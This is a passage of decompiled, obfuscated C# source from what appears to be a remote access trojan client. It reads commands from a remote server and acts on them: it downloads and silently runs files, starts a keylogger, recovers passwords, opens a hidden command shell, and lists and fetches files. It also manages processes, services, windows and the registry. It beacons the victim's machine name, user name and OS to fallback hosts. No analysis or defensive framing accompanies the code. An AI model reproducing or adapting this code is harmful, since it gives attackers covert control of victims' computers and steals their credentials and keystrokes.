							ProjectData.ClearProjectError();
						}
					}
					else
					{
						if (Operators.CompareString(text2, "/DLARUNHD/", false) != 0)
						{
							continue;
						}
						try
						{
							List<string> list2 = new List<string>();
							string[] array3 = Strings.Mid(text, 11, Strings.Len(text)).Split(new char[1] { '/' });
							string[] array4 = array3;
							foreach (string item2 in array4)
							{
								list2.Add(item2);
							}
							int index2 = list2.Count - 1;
							string text4 = Strings.Mid(text, 11, Strings.Len(text));
							((ServerComputer)RWfjxtEPH2.Computer).get_Network().DownloadFile(text4, Environment.GetEnvironmentVariable("Temp") + "\\" + list2[index2].ToString(), (string)null, (string)null, false, 100000, true);
							method_6(1);
							Process process = new Process();
							process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
							process.StartInfo.FileName = Environment.GetEnvironmentVariable("Temp") + "\\" + list2[index2].ToString();
							process.Start();
						}
						catch (Exception projectError2)
						{
							ProjectData.SetProjectError(projectError2);
							ProjectData.ClearProjectError();
						}
					}
				}
			}
			catch (Exception projectError3)
			{
				ProjectData.SetProjectError(projectError3);
				ProjectData.ClearProjectError();
			}
		}
	}

	private void gZONds6202()
	{
		string text = null;
		try
		{
			while (OiqJRw113.Connected)
			{
				text = streamReader_2.ReadLine();
				if (Operators.CompareString(text, (string)null, false) == 0)
				{
					method_6(1);
				}
				string text2 = Strings.Left(text, 10);
				if (Operators.CompareString(text2, "/PRINTTXT/", false) == 0)
				{
					try
					{
						text = Strings.Mid(text, 11, Strings.Len(text));
						Thread thread = new Thread(AcOajTzPxEkd120);
						thread.Start(text);
					}
					catch (Exception projectError)
					{
						ProjectData.SetProjectError(projectError);
						ProjectData.ClearProjectError();
					}
				}
			}
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
	}

	private void vw2Sb3x203()
	{
		string text = null;
		checked
		{
			try
			{
				while (JEN6bGHGwgh6t118.Connected)
				{
					text = qZr2JkF8mOBKA121.ReadLine();
					if (Operators.CompareString(text, (string)null, false) == 0)
					{
						method_6(1);
					}
					switch (Strings.Left(text, 10))
					{
					case "/IPREVIEW/":
						try
						{
							text = Strings.Mid(text, 11, Strings.Len(text));
							Image val = null;
							Image val2 = null;
							try
							{
								val2 = Image.FromFile(text);
								string text3 = null;
								if (val2 != null)
								{
									double num = (double)val2.get_Size().Width / (double)val2.get_Size().Height;
									double num2 = (double)val2.get_Size().Height / (double)val2.get_Size().Width;
									val = ((val2.get_Size().Width <= val2.get_Size().Height) ? val2.GetThumbnailImage((int)Math.Round(200.0 / num2), 200, (GetThumbnailImageAbort)null, default(IntPtr)) : val2.GetThumbnailImage(200, (int)Math.Round(200.0 / num), (GetThumbnailImageAbort)null, default(IntPtr)));
									MemoryStream memoryStream = new MemoryStream();
									val.Save((Stream)memoryStream, ImageFormat.get_Jpeg());
									memoryStream.Capacity = (int)memoryStream.Length;
									byte[] buffer = memoryStream.GetBuffer();
									text3 = Convert.ToBase64String(buffer);
									ld5AE2ll4RjHs120.WriteLine("/IPREVIEW/" + text3);
									ld5AE2ll4RjHs120.Flush();
									memoryStream.Dispose();
									memoryStream.Close();
									val2.Dispose();
								}
							}
							catch (Exception projectError5)
							{
								ProjectData.SetProjectError(projectError5);
								ProjectData.ClearProjectError();
							}
						}
						catch (Exception projectError6)
						{
							ProjectData.SetProjectError(projectError6);
							ProjectData.ClearProjectError();
						}
						break;
					case "/SEARCHSS/":
						try
						{
							text = Strings.Mid(text, 11, Strings.Len(text));
							string text2 = text;
							if (Operators.CompareString(text2, "1", false) == 0)
							{
								QEQaQ8eKmX7c2X13 = true;
							}
							else if (Operators.CompareString(text2, "2", false) == 0)
							{
								QEQaQ8eKmX7c2X13 = false;
								ld5AE2ll4RjHs120.WriteLine("/SEARCHFL/SEARCHEND");
								ld5AE2ll4RjHs120.Flush();
							}
						}
						catch (Exception projectError4)
						{
							ProjectData.SetProjectError(projectError4);
							ProjectData.ClearProjectError();
						}
						break;
					case "/LISTDRVS/":
						try
						{
							Thread thread3 = new Thread(G2EvZgH8EghKpQquXPdP7pc163);
							thread3.Start(ld5AE2ll4RjHs120);
						}
						catch (Exception projectError3)
						{
							ProjectData.SetProjectError(projectError3);
							ProjectData.ClearProjectError();
						}
						break;
					case "/SEARCHFL/":
						try
						{
							text = Strings.Mid(text, 11, Strings.Len(text));
							wQZXa63 = text.Split(new char[1] { '¦' });
							Thread thread2 = new Thread(HISKxC5ln144qaj105);
							thread2.Start(wQZXa63[0]);
						}
						catch (Exception projectError2)
						{
							ProjectData.SetProjectError(projectError2);
							ProjectData.ClearProjectError();
						}
						break;
					case "/DOWNFILE/":
					{
						Thread thread = new Thread(oZtk5tk62dQYnj7QxbnmcpO171);
						thread.Start(Strings.Mid(text, 11, Strings.Len(text)));
						break;
					}
					default:
						method_6(1);
						try
						{
							ld5AE2ll4RjHs120.WriteLine("/IPREVIEW/");
							ld5AE2ll4RjHs120.Flush();
						}
						catch (Exception projectError)
						{
							ProjectData.SetProjectError(projectError);
							ProjectData.ClearProjectError();
						}
						break;
					}
				}
			}
			catch (Exception projectError7)
			{
				ProjectData.SetProjectError(projectError7);
				ProjectData.ClearProjectError();
			}
		}
	}

	private void TLJjycx204()
	{
		string text = null;
		try
		{
			while (eL7hQPchhBQ98123.Connected)
			{
				text = MxiMyjoEkkCl5126.ReadLine();
				if (Operators.CompareString(text, (string)null, false) == 0)
				{
					method_6(1);
				}
				switch (Strings.Left(text, 10))
				{
				case "/KEYSLOGG/":
					try
					{
						Thread thread3 = new Thread(method_12);
						thread3.Start(false);
					}
					catch (Exception projectError4)
					{
						ProjectData.SetProjectError(projectError4);
						ProjectData.ClearProjectError();
					}
					break;
				case "/KEYSLOGR/":
					try
					{
						Thread thread2 = new Thread(method_12);
						thread2.Start(true);
					}
					catch (Exception projectError3)
					{
						ProjectData.SetProjectError(projectError3);
						ProjectData.ClearProjectError();
					}
					break;
				case "/INSTALLK/":
					try
					{
						text = Strings.Mid(text, 11, Strings.Len(text));
						Thread thread = new Thread(tWSGyRuxpm181);
						thread.Start(text);
					}
					catch (Exception projectError2)
					{
						ProjectData.SetProjectError(projectError2);
						ProjectData.ClearProjectError();
					}
					break;
				default:
					method_6(1);
					try
					{
						pOC5vQ675U05Y125.WriteLine("/KEYSLOGG/");
						pOC5vQ675U05Y125.Flush();
					}
					catch (Exception projectError)
					{
						ProjectData.SetProjectError(projectError);
						ProjectData.ClearProjectError();
					}
					break;
				}
			}
		}
		catch (Exception projectError5)
		{
			ProjectData.SetProjectError(projectError5);
			ProjectData.ClearProjectError();
		}
	}

	private void GWbFPf9205()
	{
		string text = null;
		try
		{
			while (tcpClient_3.Connected)
			{
				text = qsFqNM2Y2DkkT131.ReadLine();
				if (Operators.CompareString(text, (string)null, false) == 0)
				{
					method_6(1);
				}
				string text2 = Strings.Left(text, 10);
				if (Operators.CompareString(text2, "/PSWRECOV/", false) == 0)
				{
					try
					{
						text = Strings.Mid(text, 11, Strings.Len(text));
						Thread thread = new Thread(wHdhIDPa0HsS3Fva143);
						thread.Start(streamWriter_0);
					}
					catch (Exception projectError)
					{
						ProjectData.SetProjectError(projectError);
						ProjectData.ClearProjectError();
					}
				}
				else
				{
					method_6(1);
					try
					{
						fvcvSLsfU05qZicmS160.WriteLine("/TRYPAAAA/");
						fvcvSLsfU05qZicmS160.Flush();
					}
					catch (Exception projectError2)
					{
						ProjectData.SetProjectError(projectError2);
						ProjectData.ClearProjectError();
					}
				}
			}
		}
		catch (Exception projectError3)
		{
			ProjectData.SetProjectError(projectError3);
			ProjectData.ClearProjectError();
		}
	}

	private void Uch2Rml206()
	{
		string text = null;
		try
		{
			while (NzhKidLNk2HS2gX9M0jb133.Connected)
			{
				text = y7muAPkW9S0Q1vvole17136.ReadLine();
				if (Operators.CompareString(text, (string)null, false) == 0)
				{
					method_6(1);
				}
				string text2 = Strings.Left(text, 10);
				if (Operators.CompareString(text2, "/LISTPROC/", false) == 0)
				{
					try
					{
						Thread thread = new Thread(method_8);
						thread.Start();
					}
					catch (Exception projectError)
					{
						ProjectData.SetProjectError(projectError);
						ProjectData.ClearProjectError();
					}
				}
				else if (Operators.CompareString(text2, "/KILLPROC/", false) == 0)
				{
					try
					{
						text = Strings.Mid(text, 11, Strings.Len(text));
						Thread thread2 = new Thread(oQP1Vs53KM189);
						thread2.Start(text);
					}
					catch (Exception projectError2)
					{
						ProjectData.SetProjectError(projectError2);
						ProjectData.ClearProjectError();
					}
				}
				else
				{
					method_6(1);
					try
					{
						GP04RkhRarmzrCZrgohc135.WriteLine("/LISTPROC/");
						GP04RkhRarmzrCZrgohc135.Flush();
					}
					catch (Exception projectError3)
					{
						ProjectData.SetProjectError(projectError3);
						ProjectData.ClearProjectError();
					}
				}
			}
		}
		catch (Exception projectError4)
		{
			ProjectData.SetProjectError(projectError4);
			ProjectData.ClearProjectError();
		}
	}

	private void gXWwH8rgD0wWHd207()
	{
		string text = null;
		try
		{
			while (ZlIirvxW7A51n9oLCm0H138.Connected)
			{
				text = jiGbFfgo2WGqO2mVBhWf141.ReadLine();
				if (Operators.CompareString(text, (string)null, false) == 0)
				{
					method_6(1);
				}
				switch (Strings.Left(text, 10))
				{
				case "/LISTSERV/":
					try
					{
						Thread thread6 = new Thread(avXefVTY8tSJTRF4QpXPxIO162);
						thread6.Start();
					}
					catch (Exception projectError7)
					{
						ProjectData.SetProjectError(projectError7);
						ProjectData.ClearProjectError();
					}
					break;
				case "/STOPSERV/":
					try
					{
						text = Strings.Mid(text, 11, Strings.Len(text));
						Thread thread5 = new Thread(aYokbozAGudlYyktLQYVWzb172);
						thread5.Start(text + "¦STOP");
					}
					catch (Exception projectError6)
					{
						ProjectData.SetProjectError(projectError6);
						ProjectData.ClearProjectError();
					}
					break;
				case "/STRTSERV/":
					try
					{
						text = Strings.Mid(text, 11, Strings.Len(text));
						Thread thread4 = new Thread(aYokbozAGudlYyktLQYVWzb172);
						thread4.Start(text + "¦START");
					}
					catch (Exception projectError5)
					{
						ProjectData.SetProjectError(projectError5);
						ProjectData.ClearProjectError();
					}
					break;
				case "/DSBLSERV/":
					try
					{
						text = Strings.Mid(text, 11, Strings.Len(text));
						Thread thread3 = new Thread(aYokbozAGudlYyktLQYVWzb172);
						thread3.Start(text + "¦DISABLE");
					}
					catch (Exception projectError4)
					{
						ProjectData.SetProjectError(projectError4);
						ProjectData.ClearProjectError();
					}
					break;
				case "/MNULSERV/":
					try
					{
						text = Strings.Mid(text, 11, Strings.Len(text));
						Thread thread2 = new Thread(aYokbozAGudlYyktLQYVWzb172);
						thread2.Start(text + "¦MANUAL");
					}
					catch (Exception projectError3)
					{
						ProjectData.SetProjectError(projectError3);
						ProjectData.ClearProjectError();
					}
					break;
				case "/AUTOSERV/":
					try
					{
						text = Strings.Mid(text, 11, Strings.Len(text));
						Thread thread = new Thread(aYokbozAGudlYyktLQYVWzb172);
						thread.Start(text + "¦AUTO");
					}
					catch (Exception projectError2)
					{
						ProjectData.SetProjectError(projectError2);
						ProjectData.ClearProjectError();
					}
					break;
				default:
					method_6(1);
					try
					{
						ltNxzNounuW7uMDzwdfc140.WriteLine("/LISTSERV/");
						ltNxzNounuW7uMDzwdfc140.Flush();
					}
					catch (Exception projectError)
					{
						ProjectData.SetProjectError(projectError);
						ProjectData.ClearProjectError();
					}
					break;
				}
			}
		}
		catch (Exception projectError8)
		{
			ProjectData.SetProjectError(projectError8);
			ProjectData.ClearProjectError();
		}
	}

	private void jHbCnYz2D7ncWA208()
	{
		string text = null;
		try
		{
			while (xZsrOvirpHYfhZlCrVbS143.Connected)
			{
				text = streamReader_3.ReadLine();
				if (Operators.CompareString(text, (string)null, false) == 0)
				{
					method_6(1);
				}
				switch (Strings.Left(text, 10))
				{
				case "/REFRWIND/":
					try
					{
						Thread thread3 = new Thread(IOLP5YCKXcMd7IJK150);
						thread3.Start();
					}
					catch (Exception projectError9)
					{
						ProjectData.SetProjectError(projectError9);
						ProjectData.ClearProjectError();
					}
					break;
				case "/CLSEWIND/":
					try
					{
						text = Strings.Mid(text, 11, Strings.Len(text));
						Process processById7 = Process.GetProcessById(Conversions.ToInteger(text));
						processById7.Kill();
						Thread thread2 = new Thread(IOLP5YCKXcMd7IJK150);
						thread2.Start();
					}
					catch (Exception projectError8)
					{
						ProjectData.SetProjectError(projectError8);
						ProjectData.ClearProjectError();
					}
					break;
				case "/HIDEWIND/":
					try
					{
						text = Strings.Mid(text, 11, Strings.Len(text));
						Process processById6 = Process.GetProcessById(Conversions.ToInteger(text));
						ShowWindow(processById6.MainWindowHandle, 0);
						Thread thread = new Thread(IOLP5YCKXcMd7IJK150);
						thread.Start();
					}
					catch (Exception projectError7)
					{
						ProjectData.SetProjectError(projectError7);
						ProjectData.ClearProjectError();
					}
					break;
				case "/MINIWIND/":
					try
					{
						text = Strings.Mid(text, 11, Strings.Len(text));
						Process processById5 = Process.GetProcessById(Conversions.ToInteger(text));
						ShowWindow(processById5.MainWindowHandle, 6);
					}
					catch (Exception projectError6)
					{
						ProjectData.SetProjectError(projectError6);
						ProjectData.ClearProjectError();
					}
					break;
				case "/MAXIWIND/":
					try
					{
						text = Strings.Mid(text, 11, Strings.Len(text));
						Process processById4 = Process.GetProcessById(Conversions.ToInteger(text));
						ShowWindow(processById4.MainWindowHandle, 3);
					}
					catch (Exception projectError5)
					{
						ProjectData.SetProjectError(projectError5);
						ProjectData.ClearProjectError();
					}
					break;
				case "/RSTRWIND/":
					try
					{
						text = Strings.Mid(text, 11, Strings.Len(text));
						Process processById3 = Process.GetProcessById(Conversions.ToInteger(text));
						ShowWindow(processById3.MainWindowHandle, 9);
					}
					catch (Exception projectError4)
					{
						ProjectData.SetProjectError(projectError4);
						ProjectData.ClearProjectError();
					}
					break;
				case "/DFLTWIND/":
					try
					{
						text = Strings.Mid(text, 11, Strings.Len(text));
						Process processById2 = Process.GetProcessById(Conversions.ToInteger(text));
						ShowWindow(processById2.MainWindowHandle, 10);
					}
					catch (Exception projectError3)
					{
						ProjectData.SetProjectError(projectError3);
						ProjectData.ClearProjectError();
					}
					break;
				case "/SHOWWIND/":
					try
					{
						text = Strings.Mid(text, 11, Strings.Len(text));
						Process processById = Process.GetProcessById(Conversions.ToInteger(text));
						ShowWindow(processById.MainWindowHandle, 4);
					}
					catch (Exception projectError2)
					{
						ProjectData.SetProjectError(projectError2);
						ProjectData.ClearProjectError();
					}
					break;
				default:
					method_6(1);
					try
					{
						uUzDzGAWZ2ARrYqgXYqZ145.WriteLine("/REFRWIND/");
						uUzDzGAWZ2ARrYqgXYqZ145.Flush();
					}
					catch (Exception projectError)
					{
						ProjectData.SetProjectError(projectError);
						ProjectData.ClearProjectError();
					}
					break;
				}
			}
		}
		catch (Exception projectError10)
		{
			ProjectData.SetProjectError(projectError10);
			ProjectData.ClearProjectError();
		}
	}

	private void jKQkGbCNMNR36q209()
	{
		string text = null;
		try
		{
			while (RVFuEzTJArzy37LukGmi148.Connected)
			{
				text = ausQTxwTvTjmdKFuC151.ReadLine();
				if (Operators.CompareString(text, (string)null, false) == 0)
				{
					method_6(1);
				}
				switch (Strings.Left(text, 10))
				{
				case "/REGYVIEW/":
					try
					{
						switch (Strings.Mid(text, 11, Strings.Len(text)))
						{
						case "CU":
						{
							Thread thread6 = new Thread(geqUZ0kTHhQi429Mw5cSjIz165);
							thread6.Start("CU");
							break;
						}
						case "LM":
						{
							Thread thread6 = new Thread(geqUZ0kTHhQi429Mw5cSjIz165);
							thread6.Start("LM");
							break;
						}
						case "US":
						{
							Thread thread6 = new Thread(geqUZ0kTHhQi429Mw5cSjIz165);
							thread6.Start("US");
							break;
						}
						}
					}
					catch (Exception projectError7)
					{
						ProjectData.SetProjectError(projectError7);
						ProjectData.ClearProjectError();
					}
					break;
				case "/REGVIEWS/":
					try
					{
						string text13 = null;
						string text14 = null;
						text = Strings.Mid(text, 11, Strings.Len(text));
						string[] array5 = null;
						array5 = text.Split(new char[1] { '¥' });
						text14 = array5[0];
						text13 = array5[1];
						switch (text14)
						{
						case "CU":
						{
							Thread thread5 = new Thread(eSxVvoMbJJjHSvHy35yZZki166);
							thread5.Start(text14 + text13);
							break;
						}
						case "LM":
						{
							Thread thread5 = new Thread(eSxVvoMbJJjHSvHy35yZZki166);
							thread5.Start(text14 + text13);
							break;
						}
						case "US":
						{
							Thread thread5 = new Thread(eSxVvoMbJJjHSvHy35yZZki166);
							thread5.Start(text14 + text13);
							break;
						}
						}
					}
					catch (Exception projectError6)
					{
						ProjectData.SetProjectError(projectError6);
						ProjectData.ClearProjectError();
					}
					break;
				case "/REGVIEWV/":
					try
					{
						string text11 = null;
						string text12 = null;
						text = Strings.Mid(text, 11, Strings.Len(text));
						string[] array4 = null;
						array4 = text.Split(new char[1] { '¥' });
						text12 = array4[0];
						text11 = array4[1];
						switch (text12)
						{
						case "CU":
						{
							Thread thread4 = new Thread(method_9);
							thread4.Start(text12 + text11);
							break;
						}
						case "LM":
						{
							Thread thread4 = new Thread(method_9);
							thread4.Start(text12 + text11);
							break;
						}
						case "US":
						{
							Thread thread4 = new Thread(method_9);
							thread4.Start(text12 + text11);
							break;
						}
						}
					}
					catch (Exception projectError5)
					{
						ProjectData.SetProjectError(projectError5);
						ProjectData.ClearProjectError();
					}
					break;
				case "/REGCREAT/":
					try
					{
						string text8 = null;
						string text9 = null;
						text = Strings.Mid(text, 11, Strings.Len(text));
						string[] array3 = null;
						array3 = text.Split(new char[1] { '¥' });
						text9 = array3[0];
						text8 = array3[1];
						string text10 = array3[2];
						switch (text9)
						{
						case "CU":
						{
							Thread thread3 = new Thread(lRyDO7gJNxFb1s4OuV67zKk167);
							thread3.Start(text9 + text8 + "§" + text10);
							break;
						}
						case "LM":
						{
							Thread thread3 = new Thread(lRyDO7gJNxFb1s4OuV67zKk167);
							thread3.Start(text9 + text8 + "§" + text10);
							break;
						}
						case "US":
						{
							Thread thread3 = new Thread(lRyDO7gJNxFb1s4OuV67zKk167);
							thread3.Start(text9 + text8 + "§" + text10);
							break;
						}
						}
					}
					catch (Exception projectError4)
					{
						ProjectData.SetProjectError(projectError4);
						ProjectData.ClearProjectError();
					}
					break;
				case "/REGDELET/":
					try
					{
						string text5 = null;
						string text6 = null;
						text = Strings.Mid(text, 11, Strings.Len(text));
						string[] array2 = null;
						array2 = text.Split(new char[1] { '¥' });
						text6 = array2[0];
						text5 = array2[1];
						string text7 = array2[2];
						switch (text6)
						{
						case "CU":
						{
							Thread thread2 = new Thread(hhPx8NLIzUAb3WKX3s0w9cj168);
							thread2.Start(text6 + text5 + "§" + text7);
							break;
						}
						case "LM":
						{
							Thread thread2 = new Thread(hhPx8NLIzUAb3WKX3s0w9cj168);
							thread2.Start(text6 + text5 + "§" + text7);
							break;
						}
						case "US":
						{
							Thread thread2 = new Thread(hhPx8NLIzUAb3WKX3s0w9cj168);
							thread2.Start(text6 + text5 + "§" + text7);
							break;
						}
						}
					}
					catch (Exception projectError3)
					{
						ProjectData.SetProjectError(projectError3);
						ProjectData.ClearProjectError();
					}
					break;
				case "/REGRENAM/":
					try
					{
						string text2 = null;
						string text3 = null;
						text = Strings.Mid(text, 11, Strings.Len(text));
						string[] array = null;
						array = text.Split(new char[1] { '¥' });
						text3 = array[0];
						text2 = array[1];
						string text4 = array[2];
						switch (text3)
						{
						case "CU":
						{
							Thread thread = new Thread(F6Zg34ScJBxhmYA7V2P5hrg169);
							thread.Start(text3 + text2 + "§" + text4);
							break;
						}
						case "LM":
						{
							Thread thread = new Thread(F6Zg34ScJBxhmYA7V2P5hrg169);
							thread.Start(text3 + text2 + "§" + text4);
							break;
						}
						case "US":
						{
							Thread thread = new Thread(F6Zg34ScJBxhmYA7V2P5hrg169);
							thread.Start(text3 + text2 + "§" + text4);
							break;
						}
						}
					}
					catch (Exception projectError2)
					{
						ProjectData.SetProjectError(projectError2);
						ProjectData.ClearProjectError();
					}
					break;
				default:
					method_6(1);
					try
					{
						ZHanOQKSlcRbYla7M150.WriteLine("/REGYVIEW/");
						ZHanOQKSlcRbYla7M150.Flush();
					}
					catch (Exception projectError)
					{
						ProjectData.SetProjectError(projectError);
						ProjectData.ClearProjectError();
					}
					break;
				}
			}
		}
		catch (Exception projectError8)
		{
			ProjectData.SetProjectError(projectError8);
			ProjectData.ClearProjectError();
		}
	}

	private void ja8TxVAv5puoMd210()
	{
		string text = null;
		try
		{
			while (tcpClient_4.Connected)
			{
				text = mNbHBY57qvhq4q4gt156.ReadLine();
				if (Operators.CompareString(text, (string)null, false) == 0)
				{
					method_6(1);
				}
				switch (Strings.Left(text, 10))
				{
				case "/STARTCMD/":
					try
					{
						if (!shKaF2sIkp8axfMK144("cmd"))
						{
							P5B9z3T6b4o32 = new Process();
							P5B9z3T6b4o32.StartInfo.FileName = "cmd.exe";
							P5B9z3T6b4o32.StartInfo.CreateNoWindow = true;
							P5B9z3T6b4o32.StartInfo.UseShellExecute = false;
							P5B9z3T6b4o32.StartInfo.RedirectStandardOutput = true;
							P5B9z3T6b4o32.StartInfo.RedirectStandardInput = true;
							P5B9z3T6b4o32.StartInfo.RedirectStandardError = true;
							P5B9z3T6b4o32.OutputDataReceived += edMSAscOLt7xpkMfDDX131;
							P5B9z3T6b4o32.Start();
							P5B9z3T6b4o32.BeginOutputReadLine();
						}
					}
					catch (Exception projectError3)
					{
						ProjectData.SetProjectError(projectError3);
						ProjectData.ClearProjectError();
					}
					break;
				case "/STOPCMD/":
					try
					{
						Process[] processes = Process.GetProcesses();
						foreach (Process process in processes)
						{
							if (process.ProcessName.StartsWith("cmd"))
							{
								process.Kill();
							}
						}
					}
					catch (Exception projectError2)
					{
						ProjectData.SetProjectError(projectError2);
						ProjectData.ClearProjectError();
					}
					break;
				case "/CMDCMDGO/":
					try
					{
						text = Strings.Mid(text, 11, Strings.Len(text));
						cZrcyKtFqax33.Append(text);
						cZrcyKtFqax33.Append("\r\n");
						P5B9z3T6b4o32.StandardInput.WriteLine((object?)cZrcyKtFqax33);
						cZrcyKtFqax33.Remove(0, cZrcyKtFqax33.Length);
					}
					catch (Exception projectError)
					{
						ProjectData.SetProjectError(projectError);
						ProjectData.ClearProjectError();
					}
					break;
				}
			}
		}
		catch (Exception projectError4)
		{
			ProjectData.SetProjectError(projectError4);
			ProjectData.ClearProjectError();
		}
	}

	private void kP8ubQWSacfwBw211()
	{
		checked
		{
			while (true)
			{
				LELMUC70wIplcf15 = 0;
				cZrcyKtFqax33 = new StringBuilder();
				IaeLz9Bz7vS28 = new TcpClient();
				int delayInSeconds = GzYOYkU7u3waWbQt145(5, 25);
				method_6(delayInSeconds);
				string text = null;
				string text2 = null;
				try
				{
					if (TlRFVN6191(yuIScXDGaKi23))
					{
						text = yuIScXDGaKi23;
					}
					else
					{
						IPAddress[] hostAddresses = Dns.GetHostAddresses(yuIScXDGaKi23);
						if (hostAddresses.Length > 1)
						{
							text = hostAddresses[0].ToString();
							try
							{
								if (!TlRFVN6191(text))
								{
									text = hostAddresses[1].ToString();
								}
							}
							catch (Exception projectError)
							{
								ProjectData.SetProjectError(projectError);
								text = hostAddresses[0].ToString();
								ProjectData.ClearProjectError();
							}
						}
						else
						{
							text = hostAddresses[0].ToString();
						}
					}
				}
				catch (Exception projectError2)
				{
					ProjectData.SetProjectError(projectError2);
					ProjectData.ClearProjectError();
				}
				try
				{
					if (TlRFVN6191(LI5T9bF52xP24))
					{
						text2 = LI5T9bF52xP24;
					}
					else
					{
						IPAddress[] hostAddresses = Dns.GetHostAddresses(LI5T9bF52xP24);
						if (hostAddresses.Length > 1)
						{
							text2 = hostAddresses[0].ToString();
							try
							{
								if (!TlRFVN6191(text2))
								{
									text2 = hostAddresses[1].ToString();
								}
							}
							catch (Exception projectError3)
							{
								ProjectData.SetProjectError(projectError3);
								text2 = hostAddresses[0].ToString();
								ProjectData.ClearProjectError();
							}
						}
						else
						{
							text2 = hostAddresses[0].ToString();
						}
					}
				}
				catch (Exception projectError4)
				{
					ProjectData.SetProjectError(projectError4);
					ProjectData.ClearProjectError();
				}
				try
				{
					IaeLz9Bz7vS28.Connect(text, JRxZKRcEXj926);
					sZel9rNTnAv29 = IaeLz9Bz7vS28.GetStream();
					K8nKYh23ocE31 = new StreamReader(sZel9rNTnAv29);
					aMz1o7THlkR30 = new StreamWriter(sZel9rNTnAv29);
					LELMUC70wIplcf15 = 0;
					nZZEKWj4rLgtFjmCxsUb2QER177 = text;
					wiSrmNwqC1gJSTHkagHbEi5E178 = JRxZKRcEXj926;
				}
				catch (Exception projectError5)
				{
					ProjectData.SetProjectError(projectError5);
					try
					{
						try
						{
							IaeLz9Bz7vS28.Connect(text, HyAoUdkU5sY27);
							sZel9rNTnAv29 = IaeLz9Bz7vS28.GetStream();
							K8nKYh23ocE31 = new StreamReader(sZel9rNTnAv29);
							aMz1o7THlkR30 = new StreamWriter(sZel9rNTnAv29);
							LELMUC70wIplcf15 = 0;
							nZZEKWj4rLgtFjmCxsUb2QER177 = text;
							wiSrmNwqC1gJSTHkagHbEi5E178 = HyAoUdkU5sY27;
						}
						catch (Exception projectError6)
						{
							ProjectData.SetProjectError(projectError6);
							try
							{
								IaeLz9Bz7vS28.Connect(text2, JRxZKRcEXj926);
								sZel9rNTnAv29 = IaeLz9Bz7vS28.GetStream();
								K8nKYh23ocE31 = new StreamReader(sZel9rNTnAv29);
								aMz1o7THlkR30 = new StreamWriter(sZel9rNTnAv29);
								LELMUC70wIplcf15 = 0;
								nZZEKWj4rLgtFjmCxsUb2QER177 = text2;
								wiSrmNwqC1gJSTHkagHbEi5E178 = JRxZKRcEXj926;
							}
							catch (Exception projectError7)
							{
								ProjectData.SetProjectError(projectError7);
								try
								{
									IaeLz9Bz7vS28.Connect(text2, HyAoUdkU5sY27);
									sZel9rNTnAv29 = IaeLz9Bz7vS28.GetStream();
									K8nKYh23ocE31 = new StreamReader(sZel9rNTnAv29);
									aMz1o7THlkR30 = new StreamWriter(sZel9rNTnAv29);
									LELMUC70wIplcf15 = 0;
									nZZEKWj4rLgtFjmCxsUb2QER177 = text2;
									wiSrmNwqC1gJSTHkagHbEi5E178 = HyAoUdkU5sY27;
								}
								catch (Exception projectError8)
								{
									ProjectData.SetProjectError(projectError8);
									OHxtsM5KXOcE7h7m0c6130();
									Thread.Sleep(100);
									ProjectData.ClearProjectError();
									continue;
								}
								ProjectData.ClearProjectError();
							}
							ProjectData.ClearProjectError();
						}
					}
					catch (Exception projectError9)
					{
						ProjectData.SetProjectError(projectError9);
						Thread.Sleep(100);
						ProjectData.ClearProjectError();
						continue;
					}
					ProjectData.ClearProjectError();
				}
				method_6(1);
				try
				{
					string text3 = "Client" + Conversions.ToString(GzYOYkU7u3waWbQt145(1, 99999));
					try
					{
						if (Operators.ConditionalCompareObjectEqual(((ServerComputer)RWfjxtEPH2.Computer).get_Registry().get_CurrentUser().OpenSubKey("Software\\Microsoft", writable: false)!.GetValue("Client"), (object)null, false))
						{
							((ServerComputer)RWfjxtEPH2.Computer).get_Registry().get_CurrentUser().OpenSubKey("Software\\Microsoft", writable: true)!.SetValue("Client", text3, RegistryValueKind.String);
						}
						else
						{
							text3 = Conversions.ToString(((ServerComputer)RWfjxtEPH2.Computer).get_Registry().get_CurrentUser().OpenSubKey("Software\\Microsoft", writable: false)!.GetValue("Client"));
						}
					}
					catch (Exception projectError10)
					{
						ProjectData.SetProjectError(projectError10);
						ProjectData.ClearProjectError();
					}
					if ((Operators.CompareString(text3, (string)null, false) == 0) | (text3.Length < 2))
					{
						text3 = "Client" + Conversions.ToString(GzYOYkU7u3waWbQt145(1, 99999));
					}
					StreamWriter streamWriter = aMz1o7THlkR30;
					string[] array = new string[12]
					{
						"/TRYFIRST/",
						text3,
						"*",
						((ServerComputer)RWfjxtEPH2.Computer).get_Name(),
						"*",
						Environment.UserName,
						"*",
						((ServerComputer)RWfjxtEPH2.Computer).get_Info().get_OSFullName(),
						"*3.6*",
						null,
						null,
						null
					};
					string[] array2 = array;
					string lpszName = "";
					string lpszVer = "";
					array2[9] = Conversions.ToString(capGetDriverDescriptionA(0, ref lpszName, 0, ref lpszVer, 0));
					array[10] = "*";
					array[11] = uh57vDeLLFGedW6104();
					streamWriter.WriteLine(string.Concat(array));
					aMz1o7THlkR30.Flush();
				}
				catch (Exception projectError11)
				{
					ProjectData.SetProjectError(projectError11);
					ProjectData.ClearProjectError();
				}
				while (IaeLz9Bz7vS28.Connected)
				{
					try
					{
						string text4 = K8nKYh23ocE31.ReadLine();
						switch (Strings.Left(text4, 10))
						{
						case "/TRYTRYDK/":
							tcpClient_0 = new TcpClient();
							tcpClient_0.Connect(nZZEKWj4rLgtFjmCxsUb2QER177, wiSrmNwqC1gJSTHkagHbEi5E178);
							networkStream_0 = tcpClient_0.GetStream();
							FAV6plO6xUZud703B7Vpsi71 = new StreamReader(networkStream_0);
							ETktHEpgZ7Zsm1rVyVI3Bn70 = new StreamWriter(networkStream_0);
							IhOiDCK6HBXgdKyAf3rTA572 = new Thread(BqYtZmW192);
							IhOiDCK6HBXgdKyAf3rTA572.Start();
							ETktHEpgZ7Zsm1rVyVI3Bn70.WriteLine("/TRYDESKK/");
							ETktHEpgZ7Zsm1rVyVI3Bn70.Flush();
							continue;
						case "/TRYTRYWB/":
							sROjUukB8bUmSEi6Iclqdo73 = new TcpClient();
							sROjUukB8bUmSEi6Iclqdo73.Connect(nZZEKWj4rLgtFjmCxsUb2QER177, wiSrmNwqC1gJSTHkagHbEi5E178);
							wWTgv0SRYzICOWukIfM6tM74 = sROjUukB8bUmSEi6Iclqdo73.GetStream();
							EfPlBou5E7VJA3nBHJvI2y76 = new StreamReader(wWTgv0SRYzICOWukIfM6tM74);
